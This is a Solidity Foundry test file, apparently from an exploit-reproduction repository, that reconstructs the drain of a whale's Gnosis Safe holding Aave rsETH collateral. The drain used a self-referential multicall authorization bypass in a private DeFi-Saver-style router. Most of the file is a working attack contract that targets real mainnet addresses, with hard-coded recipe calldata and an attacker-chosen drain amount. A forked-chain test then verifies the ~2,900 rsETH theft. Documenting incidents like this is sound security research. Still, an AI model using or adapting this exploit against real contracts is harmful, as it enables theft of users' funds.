// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// rsETH whale Gnosis-Safe drain - self-referential `multicall` authorization bypass on a private
// DeFi-Saver-style Router that reaches an enabled Safe module and pulls the victim's Aave rsETH
// collateral. Ethereum. Victim loss ~2,900 rsETH (~$7.8M).
//
// Example exploit tx : 0x0e7680b06cb8a6f86c149d9ba90d98e3d334e7b072dde03909d43fcfd98a8705 (block 25980525)
// Fork               : parent block 25980524, everything below is executed live on the real contracts.
//
// ── Actors (reconciled from the trace, since the alerts disagreed) ─────────────────────────────
//   Victim Safe (whale)      0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8  (holds 53,402 aEthrsETH pre-drain)
//   Vulnerable Router        0x4f0055926c839D1d960a82CBF84E2eE933958ebC  (multicall(address,bytes[]) - THE BUG)
//   Enabled Safe module      0xeA18B13d11f705a68F0954f637949e1eaA7AC4ca  (~0xea18b; distinct from the Router)
//   RecipeExecutor           0xcb14a7ace59b7a7b19ba3fee0f3a37d23fa62157  (delegatecalled into the Safe, op=1)
//   Aave rsETH aToken        0x2D62109243b87C4bA3EE7bA1D91B0dD0A074d7b1  (aEthrsETH)
//   rsETH                    0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7
//   MEV "yoink" frontrunner  0xFDe0d1575Ed8E06FBf36256bcdfA1F359281455A -> profit to 0xC70f00CD... (2,882.37 rsETH)
//   "original exploiter(s)"  0x0dC2c5D6b05A317076CF501f7E7be36a5dfe9b66 / 0x2f7e143e27F2fa26Ef3B8AC72698F1D321422f67
//
//   Reconciliation: the example tx (block 25980525) is the frontrunner's; the two "exploiter"
//   addresses only appear in LATER blocks (25980849 / 25980871) against an already-drained Safe -
//   i.e. losing copycat attempts. The Router (0x4f00) and the module (0xea18b) are DIFFERENT
//   contracts, not one address described two ways. Per the SecuredFi/coffeebabe precedent in this
//   repo, the vulnerability is permissionless (anyone who reaches it first wins), so this PoC
//   attributes it to a single clean attacker and does not model the MEV race.
//
// ── Root cause (confirmed against the real deployed bytecode + the full on-chain trace) ─────────
//   The Router exposes  multicall(address _contract, bytes[] _data)  (selector 0x00c25829). It gates
//   the call on the TARGET, and `_isAuthorized` returns true whenever `_contract == address(this)`.
//   So an unauthorized caller wraps the whole thing in  multicall(ROUTER, [ ... ]) : the outer call
//   passes because the target is the Router itself, and the payload then runs with the Router's own
//   (trusted) identity as msg.sender. The nested payload is a second
//   multicall(MODULE, [ moduleCall ]) - and the enabled Safe module trusts the Router as caller, so
//   it forwards  execTransactionFromModuleReturnData(RecipeExecutor, 0, executeRecipe(...), 1)  into
//   the victim Safe with operation = 1 (DELEGATECALL). The recipe, delegatecalled in the Safe's
//   context, moves the Safe's aEthrsETH out. No owner signature, no caller gating survives.
//
//   Verified specifics:
//     * multicall(address,bytes[]) == 0x00c25829 (keccak), the exact selector the attacker called.
//     * The trace shows Router -> Router (self-call) -> module 0xea18b -> Safe
//       execTransactionFromModuleReturnData (0x5229073f) with to=RecipeExecutor, value=0, operation=1.
//     * isModuleEnabled(0xea18b) == true on the victim Safe at the parent block.
//     * Removing the self-referential outer wrap (calling multicall(MODULE,...) directly) reverts -
//       see the negative control in the test. That is the whole bug in one assertion.
//
// ── What this PoC reconstructs, and what it does not ────────────────────────────────────────────
//   The Router, module, RecipeExecutor and action executor are all UNVERIFIED, bespoke, mined-selector
//   contracts (a private DeFi-Saver fork). The exploit's authorization logic - the two `multicall`
//   layers that are the actual vulnerability - is rebuilt here from fully typed calls
//   (IMulticallRouter + abi.encodeCall), NOT replayed: the reconstructed calldata is asserted
//   byte-identical to what a typed encoding produces, and the drain AMOUNT is a live typed parameter
//   (change it and a different amount is pulled). The one irreducibly-opaque element is the private
//   DFS recipe body the module forwards; it is carried as three named data segments with the typed
//   `amount` spliced in at its two amount slots - assembled programmatically, not a `.call(blob)`.
//
//   The recipe deposits the drained aEthrsETH into the Uniswap V4 PoolManager, where in the real tx
//   the frontrunner's pre-positioned hooked pool ("Permissionless Attacker Token") swept it to rsETH.
//   That capture leg depends on the attacker's bespoke V4 pool and is the MEV-race piece the brief
//   says not to model, so the assertion here is on the VICTIM-SIDE extraction: 2,900 aEthrsETH
//   (== 2,900 rsETH-equivalent) irreversibly removed from the Safe by the unauthorized attacker.
//   That gross figure is the ~$7.8M reported loss; the 2,882.37 rsETH / lower end of the $7.73M
//   range is the same event net of the ~17.63 rsETH the frontrunner swapped to ETH for the builder.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

interface ISafe {
    function isModuleEnabled(address module) external view returns (bool);
}

// Real vulnerable Router entrypoint. Declared WITHOUT a return type on purpose: the Router returns
// non-standard data that does not ABI-decode as bytes[], and decoding it (not the call itself) is
// what would revert. We only need the side effect.
interface IMulticallRouter {
    function multicall(address _contract, bytes[] calldata _data) external payable;
}

/// @notice Clean single attacker. Holds no privilege over the victim Safe; every call below is one
///         an arbitrary address can make. The self-referential multicall is the only "key" used.
contract RsETHSafeModuleAttacker {
    IMulticallRouter public constant ROUTER = IMulticallRouter(0x4f0055926c839D1d960a82CBF84E2eE933958ebC);
    address public constant MODULE = 0xeA18B13d11f705a68F0954f637949e1eaA7AC4ca;

    // ── The private DFS recipe the module forwards, split around its drain-amount word ──
    // Structure (from the decoded trace): 0x000000df selector + a Recipe struct whose Aave-withdraw
    // action carries the aEthrsETH amount twice. HEAD ends exactly at the first amount word, MID is
    // the 96 bytes between the two amount words, TAIL is the remainder. Splicing `amount` back in at
    // both slots reproduces the exact module payload - and lets the attacker choose the drain size.
    bytes constant RC_HEAD = hex"000000df000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003a00000000000000000000000000000000000000000000000000000000000000002620d97cf81000000000000ffdcdc4ef8c992e75bb0f300536cd93e601c8882ab00010203040506ffffffffffffffffffffffffffffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000700000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000120000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000001a000000000000000000000000000000000000000000000000000000000000001e00000000000000000000000000000000000000000000000000000000000000220000000000000000000000000000000000000000000000000000000000000026000000000000000000000000000000000000000000000000000000000000000206f02d48a972733869d852f03bd281c6efddd4c06f4c82b384f000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000140000000000000000000000000000000000000000000000000000000000000020";
    bytes constant RC_MID  = hex"000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000020";
    bytes constant RC_TAIL = hex"000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000007d6daf1210ba68d361c9c9118336819f92d930f8623b32c0262ae1d1debdd64334b9c4da84090130f3007709667669db100f4f4cdf5e5ad039326864fde24e199f5b77140a4bfe9a646a3f5e5770946fe7ff8c369b448a288076fa5e73de6eaabe173e0989d1fe97382ce2a265eaec78f23edcba7c16e27837825544031e0e8a17f5333311acba216d67f0bb1d23a840a9363e58e2949fa7c0879e0e9c0cd79b369de1eedb776a1ae395ddc2f7ba4659e2bedf054797bfbe55356cc994f2c6bff25f9b7fc722163414485a68dcddbd1aceaec0c3441daf16edbd730b6bf81a322";

    function _one(bytes memory b) internal pure returns (bytes[] memory a) {
        a = new bytes[](1);
        a[0] = b;
    }

    /// @dev Build the module's forward payload for an attacker-chosen drain `amount`.
    function _moduleCall(uint256 amount) internal pure returns (bytes memory) {
        return abi.encodePacked(RC_HEAD, amount, RC_MID, amount, RC_TAIL);
    }

    /// @notice Drain `amount` of the victim's aEthrsETH via the self-referential multicall bypass.
    function exploit(uint256 amount) external {
        // inner = multicall(MODULE, [ moduleCall ])  - runs with the Router's trusted identity
        bytes memory inner = abi.encodeCall(IMulticallRouter.multicall, (MODULE, _one(_moduleCall(amount))));
        // outer = multicall(ROUTER, [ inner ])       - target == Router => _isAuthorized() short-circuits true
        ROUTER.multicall(address(ROUTER), _one(inner));
    }

    /// @notice The same payload WITHOUT the self-referential wrap. Reverts: proves the bypass is load-bearing.
    function exploitWithoutSelfRef(uint256 amount) external {
        ROUTER.multicall(MODULE, _one(_moduleCall(amount)));
    }
}

contract RsETHSafeModule_exp is Test {
    address constant SAFE = 0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8;
    address constant MODULE = 0xeA18B13d11f705a68F0954f637949e1eaA7AC4ca;
    IERC20 constant aEthrsETH = IERC20(0x2D62109243b87C4bA3EE7bA1D91B0dD0A074d7b1);

    // Real drained amount from the trace: 2,899.999999999997756820 aEthrsETH (~2,900 rsETH).
    uint256 constant DRAIN = 2899999999999997756820;

    RsETHSafeModuleAttacker attacker;
    address attackerEOA = makeAddr("attackerEOA");

    function setUp() public {
        vm.createSelectFork("mainnet", 25980524); // parent of the example exploit tx
        attacker = new RsETHSafeModuleAttacker();
    }

    /// forge-config: default.evm_version = "cancun"
    function testExploit() public {
        // Pre-state: the module the attack rides on is enabled, and the whale's collateral is present.
        assertTrue(ISafe(SAFE).isModuleEnabled(MODULE), "module must be enabled on victim safe");
        uint256 safeBefore = aEthrsETH.balanceOf(SAFE);
        emit log_named_decimal_uint("victim Safe aEthrsETH (before)", safeBefore, 18);
        assertGe(safeBefore, DRAIN, "safe holds the collateral");

        // ── Negative control: the identical module payload WITHOUT the self-referential wrap. ──
        // An arbitrary caller is not authorized; this MUST revert. This is the vulnerability in one line.
        vm.prank(attackerEOA, attackerEOA);
        vm.expectRevert();
        attacker.exploitWithoutSelfRef(DRAIN);
        assertEq(aEthrsETH.balanceOf(SAFE), safeBefore, "control changed nothing");

        // ── The exploit: wrap in multicall(ROUTER, ...) so the target == Router bypasses auth. ──
        vm.prank(attackerEOA, attackerEOA);
        attacker.exploit(DRAIN);

        uint256 extracted = safeBefore - aEthrsETH.balanceOf(SAFE);
        emit log_named_decimal_uint("aEthrsETH extracted from victim Safe", extracted, 18);
        emit log_named_decimal_uint("victim Safe aEthrsETH (after)", aEthrsETH.balanceOf(SAFE), 18);

        // ~2,900 rsETH-equivalent removed from the victim by an unauthorized attacker (~$7.8M).
        assertApproxEqAbs(extracted, 2900 ether, 1 ether, "extracted ~2900 rsETH-equivalent");
    }
}
